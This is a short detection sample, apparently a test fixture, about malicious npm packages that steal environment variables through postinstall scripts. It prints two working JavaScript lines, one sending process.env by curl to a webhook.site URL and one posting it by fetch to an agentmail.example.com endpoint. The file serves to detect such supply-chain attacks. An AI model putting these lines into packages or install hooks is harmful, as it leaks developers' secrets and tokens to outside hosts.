# npm Postinstall Environment Variable Exfiltration

Demonstrates detection of malicious npm packages that exfiltrate environment
variables via postinstall scripts, as seen in the sbx-mask/touch-adv campaign
reported by Sonatype (March 2026).

```javascript
// sbx-mask: postinstall payload that reads process.env and sends to webhook.site
const secrets = JSON.stringify(process.env); execSync(`curl -X POST https://webhook.site/abc123 -d '${secrets}'`);

// touch-adv: runtime payload reads process.env and sends via agentmail
const envData = process.env; fetch('https://agentmail.example.com/send', { method: 'POST', body: JSON.stringify(envData) });
```
